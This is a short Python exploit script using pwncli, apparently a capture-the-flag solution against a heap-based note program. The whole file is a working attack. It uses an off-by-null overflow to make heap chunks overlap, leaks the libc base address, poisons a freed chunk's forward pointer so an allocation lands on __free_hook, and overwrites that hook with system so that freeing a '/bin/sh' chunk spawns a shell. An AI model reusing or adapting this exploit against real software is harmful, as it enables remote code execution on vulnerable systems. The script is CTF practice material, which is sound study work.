#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def add(length:int, data="a\n"):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("length: ", str(length))
    p.sendafter("your note:\n", data)

def delete(idx:int):
    p.sendlineafter(">> ", "2")
    p.sendlineafter("index: ", str(idx))

def show(idx:int):
    p.sendlineafter(">> ", "3")
    p.sendlineafter("index: ", str(idx))
    m = p.recvline()
    info(f"Get msg: {m}")
    return m

"""
1. off-by-null 
2. leak addr
3. change fd to malloc at __free_hook
4. get shell
"""

add(0x410) # 0
add(0x80)  # 1
add(0x90)  # 2
add(0x4f0) # 3
add(0x80)  # 4

delete(2)
add(0x98, b"a"*0x90+p64(0x420+0x90+0xa0)) # 2

delete(0)
delete(3)

add(0x410) # 0

m = show(1)
libc_base_addr = u64_ex(m[:-1]) - 0x3ebca0
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

add(0x80) # 3

delete(1)
delete(3)

add(0x80, p64(libc.sym['__free_hook'])+b"\n") # 1
add(0x80, "/bin/sh\n") # 3
add(0x80, p64(libc.sym['system'])+b"\n")


delete(3)

get_flag_when_get_shell(p)

p.interactive()